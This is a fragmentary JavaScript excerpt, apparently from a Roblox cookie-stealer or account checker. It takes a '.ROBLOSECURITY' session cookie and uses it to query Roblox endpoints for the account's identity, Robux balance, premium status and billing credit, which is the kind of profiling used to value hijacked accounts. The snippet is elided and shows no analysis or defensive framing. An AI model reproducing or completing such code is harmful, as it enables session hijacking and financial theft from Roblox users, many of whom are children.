...
async function main(cookie) {
    ...
    if (cookie) {
        var statistics = await (await fetch("https://users.roblox.com/v1/users/authenticated", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
        ...
        {var rbxz = await (await fetch("https://economy.roblox.com/v1/users/"+usrID+"/currency", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
        {var ana = await (await fetch("https://premiumfeatures.roblox.com/v1/users/"+usrID+"/validate-membership", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
        ...
        {var balancez = await (await fetch("https://billing.roblox.com/v1/credit", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
